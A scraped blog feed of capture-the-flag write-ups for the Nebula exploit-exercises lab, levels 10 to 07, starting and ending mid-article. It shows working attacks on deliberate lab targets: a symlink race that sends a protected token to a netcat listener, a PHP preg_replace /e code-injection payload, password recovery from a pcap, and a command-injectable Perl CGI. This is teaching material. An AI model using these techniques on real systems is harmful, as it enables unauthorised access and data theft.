host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(\"Connecting to %s:18211 .. \", host); fflush(stdout); fd = socket(AF_INET, SOCK_STREAM, 0); memset(&amp;sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = inet_addr(host); sin.sin_port = htons(18211); if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) { printf(\"Unable to connect to host %s\\n\", host); exit(EXIT_FAILURE); }#define HITHERE \".oO Oo.\\n\" if(write(fd, HITHERE, strlen(HITHERE)) == -1) { printf(\"Unable to write banner to host %s\\n\", host); exit(EXIT_FAILURE); }#undef HITHERE printf(\"Connected!\\nSending file .. \"); fflush(stdout); ffd = open(file, O_RDONLY); if(ffd == -1) { printf(\"Damn. Unable to open file\\n\"); exit(EXIT_FAILURE); } rc = read(ffd, buffer, sizeof(buffer)); if(rc == -1) { printf(\"Unable to read from file: %s\\n\", strerror(errno)); exit(EXIT_FAILURE); } write(fd, buffer, rc); printf(\"wrote file!\\n\"); } else { printf(\"You don't have access to %s\\n\", file); }}SolutionUnfortunately for this challenge, the team from Exploit Exercises forgot an important file straight in the home folder of level 10 user! At first, I could not believe it, but here is the write up of it:level10@nebula:~$ ls -altotal 11drwxr-x--- 1 level10 level10 60 Oct 31 14:43 .drwxr-xr-x 1 root root 60 Aug 27 2012 ..-rw-r--r-- 1 level10 level10 220 May 18 2011 .bash_logout-rw-r--r-- 1 level10 level10 3353 May 18 2011 .bashrcdrwx------ 2 level10 level10 60 Oct 31 14:43 .cache-rw------- 1 level10 level10 43 Aug 19 2012 .lesshst-rw-r--r-- 1 level10 level10 675 May 18 2011 .profile-rw------- 1 level10 level10 4283 Aug 19 2012 .viminfo-rw-rw-r-- 1 level10 level10 382 Aug 19 2012 xlevel10@nebula:~$Here we can observe the file called \"x\" and it reveals the following:level10@nebula:~$ cat x | grep 6615a2ce1-b2b5-4c76-8eed-8aa5c4015c27level10@nebula:~$Hmmm, weeeeellll…​ That’s the password of your target account called flag10. Let’s take the flag!level10@nebula:~$ ssh flag10@localhostThe authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts. _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebulaFor level descriptions, please see the above URL.To log in, use the username of \"levelXX\" and password \"levelXX\", whereXX is the level number.Currently there are 20 levels (00 - 19).flag10@localhost's password:Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/New release '12.04 LTS' available.Run 'do-release-upgrade' to upgrade to it.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.flag10@nebula:~$ getflagYou have successfully executed getflag on a target accountflag10@nebula:~$And that’s it! We have completed out task. What we learned? Nothing! Now let’s get back to the intended task.Contents of the flag10 user account home folder:level10@nebula:/home/flag10$ ls -altotal 14drwxr-x--- 2 flag10 level10 93 Nov 20 2011 .drwxr-xr-x 1 root root 60 Aug 27 2012 ..-rw-r--r-- 1 flag10 flag10 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag10 flag10 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag10 flag10 675 May 18 2011 .profile-rwsr-x--- 1 flag10 level10 7743 Nov 20 2011 flag10-rw------- 1 flag10 flag10 37 Nov 20 2011 tokenlevel10@nebula:/home/flag10$And here are the most important files:level10@nebula:/home/flag10$ file flag10flag10: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not strippedlevel10@nebula:/home/flag10$And the surprise:level10@nebula:/home/flag10$ cat tokencat: token: Permission deniedlevel10@nebula:/home/flag10$I bet we have to retrieve the token somehow in order to log in to our target account log10 (same as in the above file). Let’s take a look at our files.level10@nebula:/home/flag10$ ls -altotal 14drwxr-x--- 2 flag10 level10 93 Nov 20 2011 .drwxr-xr-x 1 root root 60 Aug 27 2012 ..-rw-r--r-- 1 flag10 flag10 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag10 flag10 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag10 flag10 675 May 18 2011 .profile-rwsr-x--- 1 flag10 level10 7743 Nov 20 2011 flag10-rw------- 1 flag10 flag10 37 Nov 20 2011 tokenlevel10@nebula:/home/flag10$Only flag10 user account can access the token file, or an another vulnerable SUID applications like flag10 elf (SUID permissions: -rwsr-x—). Let’s take a look at our source code.if(access(argv[1], R_OK) == 0) {This tells all everything about this level. From the man page (level10@nebula:/home/flag10$ man access): access() checks whether the calling process can access the file path‐name. The check is done using the calling process’s real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file.Also inside this IF statement we have:ffd = open(file, O_RDONLY);⇒ In other words this is a a time-of-use to time-of-check or TOCTOU bug (https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use).⇒ If we can swap out the file between the time-of-check and the time-of-use, we should be able to send token.⇒ Race condition! Let’s try!Nebula system:level10@nebula:/home/flag10$ nano /tmp/tokenlevel10@nebula:/home/flag10$ cat /tmp/tokenHere I have full access.level10@nebula:/home/flag10$Personal system:root@yourcomputer:~$ nc -l 18211Nebula system:level10@nebula:/home/flag10$ ./flag10 /tmp/token 192.168.56.1Connecting to 192.168.56.1:18211 .. Connected!Sending file .. wrote file!level10@nebula:/home/flag10$Personal system:root@yourcomputer:~$ nc -l 18211.oO Oo.Here I have full access.⇒ If I have access to my token file then I can get my token.Hmmm. Do you remember our friendly command “ln”? Is there enough delay between our link and our access permissions? While true?Personal system:root@yourcomputer:~$ nc -lk 18211\"k\" for \"non-stop listening\".Nebula system (terminal 1):level10@nebula:~$ cd /tmplevel10@nebula:/tmp$ while true; do ln -sf /home/flag10/token test; ln -sf /tmp/token test; doneNebula system (terminal 2):level10@nebula:/tmp$ cd /tmp/level10@nebula:/tmp$ ls -altotal 4drwxrwxrwt 4 root root 120 Nov 6 14:13 .drwxr-xr-x 1 root root 220 Nov 6 13:24 ..drwxrwxrwt 2 root root 40 Nov 6 13:24 .ICE-unixdrwxrwxrwt 2 root root 40 Nov 6 13:24 .X11-unixlrwxrwxrwx 1 level10 level10 18 Nov 6 14:13 test -&gt; /home/flag10/token-rw-rw-r-- 1 level10 level10 25 Nov 6 13:46 tokenlevel10@nebula:/tmp$ while true; do /home/flag10/flag10 /tmp/token 192.168.56.1; doneConnecting to 192.168.56.1:18211 .. Connected!Sending file .. wrote file!Connecting to 192.168.56.1:18211 .. Connected!Sending file .. wrote file!Connecting to 192.168.56.1:18211 .. Connected!Sending file .. wrote file!Connecting to 192.168.56.1:18211 .. Connected!&lt; sniiiiiiiiip &gt;Personal system:root@yourcomputer:~$ nc -lk 18211.oO Oo.Here I have full access..oO Oo.Here I have full access..oO Oo.Here I have full access..oO Oo.Here I have full access..oO Oo.Here I have full access..oO Oo.Here I have full access..oO Oo.Here I have full access..oO Oo.Here I have full access.&lt; sniiiiip &gt;.oO Oo.615a2ce1-b2b5-4c76-8eed-8aa5c4015c27And for the big final of our race condition:level10@nebula:~$ ssh flag10@localhostThe authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts. _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebulaFor level descriptions, please see the above URL.To log in, use the username of \"levelXX\" and password \"levelXX\", whereXX is the level number.Currently there are 20 levels (00 - 19).flag10@localhost's password:Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/New release '12.04 LTS' available.Run 'do-release-upgrade' to upgrade to it.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.flag10@nebula:~$ getflagYou have successfully executed getflag on a target accountflag10@nebula:~$" }, { "title": "Exploit Exercises: Nebula Level 09", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-09/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:49:00 +0300", "snippet": "There’s a C setuid wrapper for some vulnerable PHP code…To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.Source code(leve...", "content": "There’s a C setuid wrapper for some vulnerable PHP code…To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.Source code(level9.php)&lt;?phpfunction spam($email){ $email = preg_replace(\"/\\./\", \" dot \", $email); $email = preg_replace(\"/@/\", \" AT \", $email); return $email;}function markup($filename, $use_me){ $contents = file_get_contents($filename); $contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents); $contents = preg_replace(\"/\\[/\", \"&lt;\", $contents); $contents = preg_replace(\"/\\]/\", \"&gt;\", $contents); return $contents;}$output = markup($argv[1], $argv[2]);print $output;?&gt;SolutionContents of the flag09 user account home folder:level09@nebula:~$ cd /home/flag09/level09@nebula:/home/flag09$ ls -altotal 13drwxr-x--- 2 flag09 level09 98 Nov 20 2011 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 flag09 flag09 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag09 flag09 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag09 flag09 675 May 18 2011 .profile-rwsr-x--- 1 flag09 level09 7240 Nov 20 2011 flag09-rw-r--r-- 1 root root 491 Nov 20 2011 flag09.phplevel09@nebula:/home/flag09$Now let’s take a peek into those files!flag09:level09@nebula:/home/flag09$ file flag09flag09: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not strippedlevel09@nebula:/home/flag09$ ./flag09PHP Notice: Undefined offset: 1 in /home/flag09/flag09.php on line 22PHP Notice: Undefined offset: 2 in /home/flag09/flag09.php on line 22PHP Warning: file_get_contents(): Filename cannot be empty in /home/flag09/flag09.php on line 13level09@nebula:/home/flag09$flag09.php:level09@nebula:/home/flag09$ cat flag09.php&lt;?phpfunction spam($email){\t$email = preg_replace(\"/\\./\", \" dot \", $email);\t$email = preg_replace(\"/@/\", \" AT \", $email);\treturn $email;}function markup($filename, $use_me){\t$contents = file_get_contents($filename);\t$contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents);\t$contents = preg_replace(\"/\\[/\", \"&lt;\", $contents);\t$contents = preg_replace(\"/\\]/\", \"&gt;\", $contents);\treturn $contents;}$output = markup($argv[1], $argv[2]);print $output;?&gt;level09@nebula:/home/flag09$Hmmmm,PHP Notice: Undefined offset: 1 in /home/flag09/flag09.php on line 22PHP Notice: Undefined offset: 2 in /home/flag09/flag09.php on line 22PHP Warning: file_get_contents(): Filename cannot be empty in /home/flag09/flag09.php on line 13We have 2 notices and one warning. According to the “C setuid wrapper for some vulnerable PHP code” and to the file_get_contents() PHP function, we must provide a file to our ELF which is C setuid wrapper to our PHP code.Ok fine but how do we get to the “getflag” command executed as the level09 user???Well, on the line \"$contents = preg_replace(\"/(email(.∗)email(.∗))/e\", \"spam(\\\"\\\\2\\\")\", $contents);\" you will observe that there is preg_replace with /e modifier which will lead to Arbitrary Code Execution.Wonder how the hell I know that? Well here is the most resourceful link on the internet for exploitable PHP functions: https://stackoverflow.com/questions/3115559/exploitable-php-functions Enjoy.Now let’s inject something. On the line \"$output = markup($argv[1], $argv[2]);\" we can observe that we call the function markup with 2 different arguments.function markup($filename, $use_me){\t$contents = file_get_contents($filename);\t$contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents);\t$contents = preg_replace(\"/\\[/\", \"&lt;\", $contents);\t$contents = preg_replace(\"/\\]/\", \"&gt;\", $contents);\treturn $contents;}Now by taking a look at the above function called markup, we can observe that the first argument will be out attack vector. Furthermore, $use_me is useless but it must be used!Let’s begin.level09@nebula:/home/flag09$ echo \"[email test@test.test]\" &gt; /tmp/testlevel09@nebula:/home/flag09$ cat /tmp/test[email test@test.test]level09@nebula:/home/flag09$First excution!level09@nebula:/home/flag09$ ./flag09 /tmp/test sexy_pussycattest AT test dot test⇒ Expected result…​ NOT GOOD!level09@nebula:/home/flag09$ echo \"[email phpinfo()]\" &gt; /tmp/testlevel09@nebula:/home/flag09$ cat /tmp/test[email phpinfo()]level09@nebula:/home/flag09$Second execution!level09@nebula:/home/flag09$ ./flag09 /tmp/test sexy_pussycatphpinfo()level09@nebula:/home/flag09$⇒ Hmm, we are getting there!level09@nebula:/home/flag09$ nano /tmp/testlevel09@nebula:/home/flag09$ cat /tmp/test[email {${phpinfo()}}]level09@nebula:/home/flag09$Third execution!level09@nebula:/home/flag09$ ./flag09 /tmp/test sexy_pussycatphpinfo()PHP Version =&gt; 5.3.6-13ubuntu3.2System =&gt; Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686Build Date =&gt; Oct 13 2011 23:17:32Server API =&gt; Command Line InterfaceVirtual Directory Support =&gt; disabledConfiguration File (php.ini) Path =&gt; /etc/php5/cli&lt;sniiiiiiiiiiiiiiiiiiiiiiiiip of large output&gt;level09@nebula:/home/flag09$⇒ Gentlemen’s we have achieved an Arbitrary Code Execution of an PHP function.WOW, WOW, wait a second! We have executed only a PHP function using an C setuid wrapper for some vulnerable PHP code. But instead of executing a PHP function we need to execute a linux system command (getflag) as the user level09. Fun time. Check setuid permission.level09@nebula:/home/flag09$ ls -altotal 13drwxr-x--- 2 flag09 level09 98 Nov 20 2011 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 flag09 flag09 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag09 flag09 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag09 flag09 675 May 18 2011 .profile-rwsr-x--- 1 flag09 level09 7240 Nov 20 2011 flag09-rw-r--r-- 1 root root 491 Nov 20 2011 flag09.phplevel09@nebula:/home/flag09$Perfect, using setuid on flag09 ELF we can leverage our commands to be executed as level09. But how do we linux system command? Weeeeellll, by using another PHP function (daaaah lol).Fourth execution!level09@nebula:/home/flag09$ nano /tmp/testlevel09@nebula:/home/flag09$ cat /tmp/test[email {${shell_exec(\"ls -lart\");}}]level09@nebula:/home/flag09$ ./flag09 /tmp/test sexy_pussycatPHP Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING, expecting T_STRING in /home/flag09/flag09.php(15) : regexp code on line 1PHP Fatal error: preg_replace(): Failed evaluating code:spam(\"{${shell_exec(\\\"ls -lart\\\");}}\") in /home/flag09/flag09.php on line 15level09@nebula:/home/flag09$⇒ FAIL! We can not escape the “\" in order to execute a proper command.⇒ Small trick for you guys.level09@nebula:/home/flag09$ nano /tmp/testlevel09@nebula:/home/flag09$ cat /tmp/test[email {${system($use_me)}}]level09@nebula:/home/flag09$ ./flag09 /tmp/test sexy_pussycatsh: sexy_pussycat: command not foundPHP Notice: Undefined variable: in /home/flag09/flag09.php(15) : regexp code on line 1level09@nebula:/home/flag09$Apparently we do not have a system command called “sexy_pussycat”, sad day…​ But for the grand final:level09@nebula:/home/flag09$ ./flag09 /tmp/test getflagYou have successfully executed getflag on a target accountPHP Notice: Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1level09@nebula:/home/flag09$Well done! At this point you have finished 50% of Nebula from Exploit Exercises. Share, subscribe and ask question!" }, { "title": "Exploit Exercises: Nebula Level 08", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-08/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:49:00 +0300", "snippet": "World readable files strike again. Check what that user was up to, and use it to log into flag08 account.To do this level, log in as the level08 account with the password level08. Files for this le...", "content": "World readable files strike again. Check what that user was up to, and use it to log into flag08 account.To do this level, log in as the level08 account with the password level08. Files for this level can be found in /home/flag08.Source codeThere is no source code available for this levelSolutionAs usual let’s go to our flag account folder. I bet you will get bored of that at some point.level08@nebula:~$ cd /home/flag08/level08@nebula:/home/flag08$ ls -altotal 14drwxr-x--- 2 flag08 level08 86 Aug 19 2012 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 flag08 flag08 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag08 flag08 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag08 flag08 675 May 18 2011 .profile-rw-r--r-- 1 root root 8302 Nov 20 2011 capture.pcaplevel08@nebula:/home/flag08$Hmm, for the first time it seems to be a pcap file!level08@nebula:/home/flag08$ file capture.pcapcapture.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)level08@nebula:/home/flag08$Definitely! But what is wireshark or tcpdump?Wireshark is a network packet analyzer. A network packet analyzer will try to capture network packets and tries to display that packet data as detailed as possible.You could think of a network packet analyzer as a measuring device used to examine what’s going on inside a network cable, just like a voltmeter is used by an electrician to examine what’s going on inside an electric cable (but at a higher level, of course).In the past, such tools were either very expensive, proprietary, or both. However, with the advent of Wireshark, all that has changed.Wireshark is perhaps one of the best open source packet analyzers available today.And in other simpler words, tcpdump is the CLI (Command Line Interface) tool as Wireshark.As you can see we have to open the “capture.pcap” file in a one of the above described tools and to get some information about our task. Personally I enjoy and know Wireshark, but here I can not install anything. Let’s make a simple HTTP server using python to retrive our file from the server.level08@nebula:/home/flag08$ python -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 ...level08@nebula:/home/flag08$ python -m SimpleHTTPServerServing HTTP on 0.0.0.0 port 8000 ...192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] \"GET / HTTP/1.1\" 200 -192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] code 404, message File not found192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] \"GET /robots.txt HTTP/1.1\" 404 -192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] code 404, message File not found192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:57:43] \"GET /favicon.ico HTTP/1.1\" 404 -192-168-0-104.myownisp.hacker - - [24/Oct/2017 12:58:25] \"GET /capture.pcap HTTP/1.1\" 200 -^CTraceback (most recent call last): File \"/usr/lib/python2.7/runpy.py\", line 162, in _run_module_as_main \"__main__\", fname, loader, pkg_name) File \"/usr/lib/python2.7/runpy.py\", line 72, in _run_code exec code in run_globals File \"/usr/lib/python2.7/SimpleHTTPServer.py\", line 220, in &lt;module&gt; test() File \"/usr/lib/python2.7/SimpleHTTPServer.py\", line 216, in test BaseHTTPServer.test(HandlerClass, ServerClass) File \"/usr/lib/python2.7/BaseHTTPServer.py\", line 602, in test httpd.serve_forever() File \"/usr/lib/python2.7/SocketServer.py\", line 225, in serve_forever r, w, e = select.select([self], [], [], poll_interval)KeyboardInterruptlevel08@nebula:/home/flag08$At this point I closed my HTTP server. Let’s see the file I have just downloaded.Right click on first packet &gt; Follow &gt; TCP StreamAt this point you could try your luck with the given password, but you can be also smarter and interpret everything in hexa.In other words: 00000000 ff fd 25 ..%00000000 ff fc 25 ..% 00000003 ff fb 26 ff fd 18 ff fd 20 ff fd 23 ff fd 27 ff ..&amp;..... ..#..'. 00000013 fd 24 .$00000003 ff fe 26 ff fb 18 ff fb 20 ff fb 23 ff fb 27 ff ..&amp;..... ..#..'.00000013 fc 24 .$ 00000015 ff fa 20 01 ff f0 ff fa 23 01 ff f0 ff fa 27 01 .. ..... #.....'. 00000025 ff f0 ff fa 18 01 ff f0 ........00000015 ff fa 20 00 33 38 34 30 30 2c 33 38 34 30 30 ff .. .3840 0,38400.00000025 f0 ff fa 23 00 53 6f 64 61 43 61 6e 3a 30 ff f0 ...#.Sod aCan:0..00000035 ff fa 27 00 00 44 49 53 50 4c 41 59 01 53 6f 64 ..'..DIS PLAY.Sod00000045 61 43 61 6e 3a 30 ff f0 ff fa 18 00 78 74 65 72 aCan:0.. ....xter00000055 6d ff f0 m.. 0000002D ff fb 03 ff fd 01 ff fd 22 ff fd 1f ff fb 05 ff ........ \"....... 0000003D fd 21 .!00000058 ff fd 03 ff fc 01 ff fb 22 ff fa 22 03 01 00 00 ........ \"..\"....00000068 03 62 03 04 02 0f 05 00 00 07 62 1c 08 02 04 09 .b...... ..b.....00000078 42 1a 0a 02 7f 0b 02 15 0f 02 11 10 02 13 11 02 B....... ........00000088 ff ff 12 02 ff ff ff f0 ff fb 1f ff fa 1f 00 b1 ........ ........00000098 00 31 ff f0 ff fd 05 ff fb 21 .1...... .! 0000003F ff fa 22 01 03 ff f0 ..\"....000000A2 ff fa 22 01 07 ff f0 ..\".... 00000046 ff fa 21 03 ff f0 ff fb 01 ff fd 00 ff fe 22 ..!..... ......\"000000A9 ff fd 01 ff fb 00 ff fc 22 ........ \" 00000055 ff fa 22 03 03 e2 03 04 82 0f 07 e2 1c 08 82 04 ..\"..... ........ 00000065 09 c2 1a 0a 82 7f 0b 82 15 0f 82 11 10 82 13 11 ........ ........ 00000075 82 ff ff 12 82 ff ff ff f0 ........ . 0000007E 0d 0a 4c 69 6e 75 78 20 32 2e 36 2e 33 38 2d 38 ..Linux 2.6.38-8 0000008E 2d 67 65 6e 65 72 69 63 2d 70 61 65 20 28 3a 3a -generic -pae (:: 0000009E 66 66 66 66 3a 31 30 2e 31 2e 31 2e 32 29 20 28 ffff:10. 1.1.2) ( 000000AE 70 74 73 2f 31 30 29 0d 0a 0a 01 00 77 77 77 62 pts/10). ....wwwb 000000BE 75 67 73 20 6c 6f 67 69 6e 3a 20 ugs logi n:000000B2 6c l 000000C9 00 6c .l000000B3 65 e 000000CB 00 65 .e000000B4 76 v 000000CD 00 76 .v000000B5 65 e 000000CF 00 65 .e000000B6 6c l 000000D1 00 6c .l000000B7 38 8 000000D3 00 38 .8000000B8 0d . 000000D5 01 . 000000D6 00 0d 0a 50 61 73 73 77 6f 72 64 3a 20 ...Passw ord:000000B9 62 b000000BA 61 a000000BB 63 c000000BC 6b k000000BD 64 d000000BE 6f o000000BF 6f o000000C0 72 r000000C1 7f .000000C2 7f .000000C3 7f .000000C4 30 0000000C5 30 0000000C6 52 R000000C7 6d m000000C8 38 8000000C9 7f .000000CA 61 a000000CB 74 t000000CC 65 e000000CD 0d . 000000E3 00 0d 0a ... 000000E6 01 . 000000E7 00 0d 0a 4c 6f 67 69 6e 20 69 6e 63 6f 72 72 65 ...Login incorre 000000F7 63 74 0d 0a 77 77 77 62 75 67 73 20 6c 6f 67 69 ct..wwwb ugs logi 00000107 6e 3a 20 n:Here you can observe that the “dots” are actually 0x7f in hexa which means “Backspace” in ASCII. So instead of “backdoor…​00Rm8.ate” as password we have “backd00Rmate”. For the grand final:level08@nebula:/home/flag08$ iduid=1009(level08) gid=1009(level08) groups=1009(level08)level08@nebula:/home/flag08$ su flag08Password:sh-4.2$ iduid=991(flag08) gid=991(flag08) groups=991(flag08)sh-4.2$ getflagYou have successfully executed getflag on a target accountsh-4.2$See you in the next tutorial.Sourceshttps://www.wireshark.org/docs/wsug_html_chunked/ChapterIntroduction.html" }, { "title": "Exploit Exercises: Nebula Level 07", "url": "/nitesculucian.github.io/2018/07/16/exploit-exercises-nebula-level-07/", "categories": "nebula, writeups", "tags": "nebula, writeups, level, exploit, exercise, tutorial, solution", "date": "2018-07-16 21:48:00 +0300", "snippet": "The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.To do this level, log in as the level07 account with the ...", "content": "The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.Source code(index.cgi)#!/usr/bin/perluse CGI qw{param};print \"Content-type: text/html\\n\\n\";sub ping { $host = $_[0]; print(\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;\"); @output = `ping -c 3 $host 2&gt;&amp;1`; foreach $line (@output) { print \"$line\"; } print(\"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\");}# check if Host set. if not, display normal page, etcping(param(\"Host\"));SolutionWell, you will be surprised that this challenge took me days to complete because my webserver on my machine is getting down at every 20 minutes after system boot. I have not researched more about why the challenge is crashing all the time, but here is the simple solution of this nice challenge:level07@nebula:~$ lsindex.cgilevel07@nebula:~$ cat index.cgi&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;level07@nebula:~$Hmm, let’s go the flag account folder.level07@nebula:/home/flag07$ ls -altotal 10drwxr-x--- 2 flag07 level07 102 Nov 20 2011 .drwxr-xr-x 1 root root 80 Aug 27 2012 ..-rw-r--r-- 1 flag07 flag07 220 May 18 2011 .bash_logout-rw-r--r-- 1 flag07 flag07 3353 May 18 2011 .bashrc-rw-r--r-- 1 flag07 flag07 675 May 18 2011 .profile-rwxr-xr-x 1 root root 368 Nov 20 2011 index.cgi-rw-r--r-- 1 root root 3719 Nov 20 2011 thttpd.conflevel07@nebula:/home/flag07$Here we are able to see two files, index.cgi and thttpd.conf. Let’s read their content.level07@nebula:/home/flag07$ cat index.cgi#!/usr/bin/perluse CGI qw{param};print \"Content-type: text/html\\n\\n\";sub ping {\t$host = $_[0];\tprint(\"&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;\");\t@output = `ping -c 3 $host 2&gt;&amp;1`;\tforeach $line (@output) { print \"$line\"; }\tprint(\"&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\");}# check if Host set. if not, display normal page, etcping(param(\"Host\"));And.level07@nebula:/home/flag07$ cat thttpd.conf# /etc/thttpd/thttpd.conf: thttpd configuration file# This file is for thttpd processes created by /etc/init.d/thttpd.# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.# Specifies an alternate port number to listen on.port=7007# Specifies a directory to chdir() to at startup. This is merely a convenience -# you could just as easily do a cd in the shell script that invokes the program.dir=/home/flag07# Do a chroot() at initialization time, restricting file access to the program's# current directory. If chroot is the compiled-in default (not the case on# Debian), then nochroot disables it. See thttpd(8) for details.nochroot#chroot# Specifies a directory to chdir() to after chrooting. If you're not chrooting,# you might as well do a single chdir() with the dir option. If you are# chrooting, this lets you put the web files in a subdirectory of the chroot# tree, instead of in the top level mixed in with the chroot files.#data_dir=# Don't do explicit symbolic link checking. Normally, thttpd explicitly expands# any symbolic links in filenames, to check that the resulting path stays within# the original document tree. If you want to turn off this check and save some# CPU time, you can use the nosymlinks option, however this is not# recommended. Note, though, that if you are using the chroot option, the# symlink checking is unnecessary and is turned off, so the safe way to save# those CPU cycles is to use chroot.#symlinks#nosymlinks# Do el-cheapo virtual hosting. If vhost is the compiled-in default (not the# case on Debian), then novhost disables it. See thttpd(8) for details.#vhost#novhost# Use a global passwd file. This means that every file in the entire document# tree is protected by the single .htpasswd file at the top of the tree.# Otherwise the semantics of the .htpasswd file are the same. If this option is# set but there is no .htpasswd file in the top-level directory, then thttpd# proceeds as if the option was not set - first looking for a local .htpasswd# file, and if that doesn't exist either then serving the file without any# password. If globalpasswd is the compiled-in default (not the case on Debian),# then noglobalpasswd disables it.#globalpasswd#noglobalpasswd# Specifies what user to switch to after initialization when started as root.user=flag07# Specifies a wildcard pattern for CGI programs, for instance \"**.cgi\" or# \"/cgi-bin/*\". See thttpd(8) for details.cgipat=**.cgi# Specifies a file of throttle settings. See thttpd(8) for details.#throttles=/etc/thttpd/throttle.conf# Specifies a hostname to bind to, for multihoming. The default is to bind to# all hostnames supported on the local machine. See thttpd(8) for details.#host=# Specifies a file for logging. If no logfile option is specified, thttpd logs# via syslog(). If logfile=/dev/null is specified, thttpd doesn't log at all.#logfile=/var/log/thttpd.log# Specifies a file to write the process-id to. If no file is specified, no# process-id is written. You can use this file to send signals to thttpd. See# thttpd(8) for details.#pidfile=# Specifies the character set to use with text MIME types.#charset=iso-8859-1# Specifies a P3P server privacy header to be returned with all responses. See# http://www.w3.org/P3P/ for details. Thttpd doesn't do anything at all with the# string except put it in the P3P: response header.#p3p=# Specifies the number of seconds to be used in a \"Cache-Control: max-age\"# header to be returned with all responses. An equivalent \"Expires\" header is# also generated. The default is no Cache-Control or Expires headers, which is# just fine for most sites.#max_age=level07@nebula:/home/flag07$index.cgi informations: ping(param(“Host”)); ⇒ We have to provide a GET parameter called “Host” to out request to index.cgi perl script. @output = ping -c 3 $host 2&gt;&amp;1; ⇒ The GET parameter “Host” is used without any sanitisation checks directly at this line in $host.⇒ Command Injection! But where?thttpd.conf informations: /etc/thttpd/thttpd.conf: thttpd configuration file ⇒ The config file of our web server (thttpd)! port=7007 ⇒ The port where our web server is listening! cgipat=**.cgi ⇒ Is interpreting perl scripts! This is getting so easy…​ I just need…​ 